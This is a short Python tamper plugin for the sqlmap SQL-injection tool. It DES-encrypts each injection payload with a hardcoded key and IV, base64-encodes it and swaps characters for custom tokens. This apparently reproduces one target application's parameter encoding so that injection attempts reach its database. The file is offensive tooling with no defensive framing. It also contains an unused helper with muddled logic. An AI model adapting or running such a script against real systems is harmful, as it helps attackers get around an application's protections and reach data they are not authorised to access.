from pyDes import des, CBC, PAD_PKCS5
import base64
from sqlmap.lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW


def encrypt2(data):
    iv = bytes([1, 2, 3, 4, 5, 6, 7, 8])  # 偏移量8位
    iv2 = [0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08]
    # a = [1, 2, 3, 4, 5, 6, 7, 8]
    # b=  "12345678"   #传这个是不行的，这个是字符串

    k = des("0" * 8, 1, b'\x01\x02\x03\x04\x05\x06\x07\x08', pad=None, padmode=PAD_PKCS5)
    k.setKey("ilovethisgame")
    en = k.encrypt(data.encode("UTF-8"))
    result = base64.b64encode(en).decode("UTF-8")
    # print(result)
    return result


def encryptEncode(paramString) -> str:
    if None == paramString:
        return ""

    str = encrypt2(paramString)
    str = str.replace("+", "@2HJB@")
    str = str.replace("%", "@2HJ5@")
    str = str.replace("+", "@2HJB@")
    str = str.replace(" ", "@2HJ0@")
    str = str.replace("/", "@2HJF@")
    str = str.replace("?", "@3HJF@")
    str = str.replace("#", "@2HJ3@")
    str = str.replace("&", "@2HJ6@")
    str = str.replace("=", "@3HJD@")
    str = str.replace("\r\n", "").replace("\n", "").replace("\r", "")
    str = str.replace("@", "PAATTP")
    return str


def encodeSafe(paramString) -> str:
    str1 = ""
    for i in paramString:
        str2 = ""
        tmp = hex(ord(i))[2:]
        if i > 'ÿ':
            str2 += "0" * (4 - len(tmp)) + tmp
            str1 = str1 + "^" + tmp
        elif (i >= '0' and (i <= '/' or i >= 'A')) and ((i <= 'Z' or i >= 'a') and i <= 'z'):
            str1 += i
        else:
            str2 += ("0" + hex(ord(i))[2:]) * (2 - len(hex(ord(i))[2:]))
            str1 = str1 + "~" + tmp

    return str1


def dependencies():
    pass


def tamper(payload, **kwargs):

    retVal = encryptEncode(payload)
    return retVal



